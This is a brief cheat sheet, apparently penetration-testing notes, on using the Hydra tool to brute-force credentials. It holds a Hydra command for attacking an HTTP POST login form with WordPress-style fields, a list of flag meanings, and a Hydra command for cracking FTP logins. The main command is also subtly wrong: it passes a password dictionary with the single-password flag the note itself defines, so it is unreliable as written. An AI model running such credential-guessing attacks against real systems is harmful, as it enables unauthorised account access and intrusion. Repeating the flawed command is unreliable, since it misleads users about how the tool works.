```hydra -L <USERNAME DICTIONARY> -p <PASSWORD DICTIONARY> <IP> http-post-form "<PATH TO PAGE>:log=^USER^&pwd=^PWD^:<ERROR>" -t 30```

**-L**  specifies a dictionary of usernames
**-l**  specifies a single username
**-P**  specifies a dictionary of passwords
**-p**  specifies a signle password
<br>
**-t**  number if threads to use
<br>
``log=^USER^&pwd=^PWD^``  this will specify the variables as they appear in an HTTP request
``<ERROR>`` some text on the page that indicades a failed login


## Cracking FTP creds:
```
hydra -L usernames -P passwords ftp://<IP>
```


